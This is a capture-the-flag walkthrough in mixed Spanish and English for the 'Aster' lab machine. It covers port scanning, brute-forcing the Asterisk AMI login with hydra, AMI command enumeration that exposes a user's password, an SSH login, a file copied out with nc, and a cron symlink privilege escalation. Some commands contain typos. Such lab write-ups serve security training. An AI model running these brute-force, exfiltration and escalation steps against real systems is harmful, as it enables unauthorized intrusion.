# Aster

## Recon
```bash
nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
nmap -sVC -p22,80,1720,2000,5038 -oN service $TARGET
```

**Output**
```
22/tcp   open  ssh
80/tcp   open  http
1720/tcp open  h323q931
2000/tcp open  cisco-sccp
5038/tcp open  unknown
------
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Aster CTF
|_http-server-header: Apache/2.4.18 (Ubuntu)
1720/tcp open  h323q931
2000/tcp open  cisco-sccp
5038/tcp open  asterisk    Asterisk Call Manager 5.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Entramos en el navegador y podemos descargarnos un script python 

### Es un ejecutable 

## Reverse engineering
https://github.com/zrax/pycdc
```bash
./pycdc /output.pyc 
```

**Output**
```
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
if 0:
    (i1 * ii1IiI1i % OOooOOo) / I11i / o0O / IiiIII111iI
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
if 0:
    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
print o0OO00
```
### Lo copiamos en un archivo .py 
```bash
python2 output.py
```

**Output**
```
Good job, user "admin" the open source framework for building communications, installed in the server.
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
```


## UDP Recon

```bash
nmap -sU --top-ports 2000 -n -Pn --min-rate 2000 $TARGET --open -oN udp-top-2000
```
**Output**
```
PORT     STATE SERVICE
5060/udp open  sip
```

## We have a valid user let's brutte force the AMI (Remote Asteriks Administration interface) login  with hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET -s 5038 asterisk
```

**Output**
```
[DATA] attacking asterisk://10.130.142.39:5038/
[5038][asterisk] host: 10.130.142.39   login: admin   password: abc123
1 of 1 target successfully completed, 1 valid password found
```
### Nos conectamos con nc 
```bash
nc 10.130.142.39 5038
ACTION: login
USERNAME: admin
SECRET: abc123
```

## AMI enumeration
```bash
ACTION: lsitcommands
ACTION: core show status
ACTION: module show
```
**Output**
```bash
# The command most interesting
Command: Execute Asterisk CLI Command.  (Priv: command,all)
```

```bash
ACTION: command
COMMAND: sip show history
```

**Output**
```
!   -- Execute a shell command
```
### Version 
```bash
ACTION: command
COMMAND: core show version
```

**Output**
```
Output: Asterisk 16.12.0 built by root @ ubuntu on a x86_64 running Linux on 2020-08-10 21:32:11 UTC
```

### User enumeration
```bash
action: command         
command: sip show users  
```
**Output**
```
Output: harry                      p4ss#w0rd!#                       test             No   No        
```
## Probamos conexion ssh 
```bash
ssh hary@$TARGET
cat user.txt 
cat Example_Root.jar | nc 192.168.130.5 80
nc -nlvp 80 > Example_Root.jar
```

## Reverse engineering 
```bash
jar xf Example_Root.jar 
strings Example_Root.class
```
> Verify if /tmp/flag.dat exist if exist write my secret <3 baby in /home/harry/root.txt

## Linux Enumeration
```bash
cat /etc/crontab
```

**Output**
```
*  *    * * *   root    cd /root/java/ && bash run.sh
```

## Priviesc

### Symlink Attack
```bash
ln -sf /tmp/malicious.jar /root/java/Example_Root.jar
ln -sf /tmp/root.txt /home/harry/root.txt
touch /tmp/flag.dat
# After 1 min 
cat /tmp/root.txt
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [hydra](../../../tools/creds/hydra.md)
- [netcat](../../../tools/pivot/netcat.md)
- [pycdc](../../../tools/reversing/pycdc.md)
- [asterisk-ami-command-execution](../../../exploits/network-services/asterisk-ami-command-execution.md)
- [java-cron-symlink](../../../privesc/linux/java-cron-symlink.md)
